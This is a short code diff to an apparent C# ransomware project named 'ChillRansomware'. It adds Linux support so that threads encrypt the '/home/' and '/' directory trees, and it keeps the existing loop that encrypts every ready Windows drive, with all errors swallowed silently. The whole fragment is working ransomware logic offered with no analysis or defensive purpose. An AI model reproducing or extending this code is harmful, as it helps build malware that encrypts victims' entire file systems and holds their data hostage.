@@ -22,15 +22,29 @@ namespace ChillRansomware
 
             List<Thread> Threads = new List<Thread>();
 
-            //Iterate through drives
-            foreach (DriveInfo d in DriveInfo.GetDrives())
+            if (OperatingSystem.IsLinux())
             {
-                if (d.IsReady == true)
+                Threads.Add(new Thread(() =>
                 {
-                    Threads.Add(new Thread(() =>
+                    try { EncryptDirectory("/home/", ref PasswordBytes, ref salt); } catch { }
+                }));
+                Threads.Add(new Thread(() =>
+                {
+                    try { EncryptDirectory("/", ref PasswordBytes, ref salt); } catch { }
+                }));
+            }
+            else
+            {
+                //Iterate through drives
+                foreach (DriveInfo d in DriveInfo.GetDrives())
+                {
+                    if (d.IsReady == true)
                     {
-                        try { EncryptDirectory(d.Name, ref PasswordBytes, ref salt); } catch { }
-                    }));
+                        Threads.Add(new Thread(() =>
+                        {
+                            try { EncryptDirectory(d.Name, ref PasswordBytes, ref salt); } catch { }
+                        }));
+                    }
                 }
             }
 
